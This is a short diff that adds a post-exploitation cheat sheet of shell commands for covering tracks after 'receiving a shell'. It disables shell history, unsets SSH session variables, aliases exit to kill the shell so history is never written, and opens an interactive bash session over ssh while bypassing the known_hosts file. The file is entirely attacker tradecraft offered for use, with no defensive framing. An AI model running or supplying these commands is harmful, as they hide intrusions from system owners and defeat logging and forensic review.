@@ -1,0 +1,11 @@
+# First command after receiving a shell:
+
+export HISTFILE=/dev/null
+unset SSH_CONNECTION
+unset SSH_CLIENT
+
+# To quit, kill your shell:
+alias exit='kill -9 $$'
+
+# Avoid being detect in the know_hosts file:
+ssh -o UserKnownHostsFile=/dev/null -T user@server.org "bash -i"
